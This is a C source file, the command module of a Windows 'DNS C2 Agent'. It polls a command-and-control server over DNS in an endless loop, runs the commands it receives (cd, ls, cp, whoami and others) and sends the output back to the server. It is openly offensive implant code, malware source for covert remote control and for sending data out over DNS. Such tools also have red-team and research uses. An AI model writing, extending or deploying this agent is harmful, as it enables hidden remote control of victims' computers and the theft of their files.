/**
 * Command.c - Command execution for DNS C2 Agent
 * 
 * Handles parsing and execution of commands received from the C2 server,
 * as well as formatting and returning the results.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <direct.h>
#include <shlwapi.h>

 #include "../include/Command.h"
 #include "../include/Transport.h"
 #include "../include/Utils.h"
 #include "../include/Config.h"
 #include "../include/Parser.h"
   
 // Include command headers
 #include "../include/cd.h"
 #include "../include/cp.h"
 #include "../include/ls.h"
 #include "../include/mkdir.h"
 #include "../include/pwd.h"
 #include "../include/whoami.h"

#pragma comment(lib, "shlwapi.lib")

// Maximum command output size
#define MAX_OUTPUT_SIZE 8192

// Structure to hold command information
typedef struct {
    char* name;
    CommandFunction function;
    char* description;
} CommandEntry;

// Command registry
static CommandEntry commands[] = {
    {"cd", cmd_cd, "Change directory"},
    {"pwd", cmd_pwd, "Print working directory"},
    {"ls", cmd_ls, "List directory contents"},
    {"cp", cmd_cp, "Copy file"},
    {"whoami", cmd_whoami, "Print current user"},
    {"mkdir", cmd_mkdir, "Create directory"},
    {NULL, NULL, NULL} // Sentinel
};

/**
 * Initialize the command module
 * 
 * @return TRUE if successful, FALSE otherwise
 */
BOOL command_init() {
    // Any initialization needed for the command module
    return TRUE;
}

/**
 * Clean up the command module
 */
void command_cleanup() {
    // Any cleanup needed for the command module
}

/**
 * Execute a command
 * 
 * @param command_str The command string to execute
 * @return The result of the command (must be freed by caller)
 */
char* execute_command(const char* command_str) {
    if (command_str == NULL || *command_str == '\0') {
        return _strdup("Error: Empty command");
    }
    
    // Parse the command and arguments
    char* command;
    char* args;
    
    if (!parse_command(command_str, &command, &args)) {
        return _strdup("Error: Failed to parse command");
    }
    
    // Look up the command in the registry
    CommandEntry* entry = commands;
    while (entry->name != NULL) {
        if (strcmp(entry->name, command) == 0) {
            // Execute the command function
            char* result = entry->function(args);
            free(command);
            free(args);
            return result;
        }
        entry++;
    }
    
    // Command not found
    char* result = (char*)malloc(100);
    if (result != NULL) {
        sprintf_s(result, 100, "Error: Unknown command '%s'", command);
    }
    
    free(command);
    free(args);
    return result;
}

/**
 * Main command processing loop
 * 
 * This function polls for commands from the C2 server,
 * executes them, and sends the results back.
 */
void command_loop() {
    char agent_id[64];
    sprintf_s(agent_id, sizeof(agent_id), "agent-%08x", GetTickCount());
    
    const char* domain = get_c2_domain();
    DWORD sleep_interval = get_sleep_interval();
    
    while (1) {
        // Request a command from the C2 server
        char* command = dns_request_command(agent_id, domain);
        
        if (command != NULL && strlen(command) > 0) {
            // Log the received command (for debugging)
            #ifdef DEBUG
            printf("[DEBUG] Received command: %s\n", command);
            #endif
            
            // Execute the command
            char* result = execute_command(command);
            
            if (result != NULL) {
                // Generate a result ID
                char result_id[9];
                sprintf_s(result_id, sizeof(result_id), "%08x", GetTickCount());
                
                // Send the result back to the C2 server
                dns_send_result(agent_id, result_id, result, domain);
                
                free(result);
            }
            
            free(command);
        }
        
        // Sleep before polling again
        Sleep(sleep_interval);
    }
}
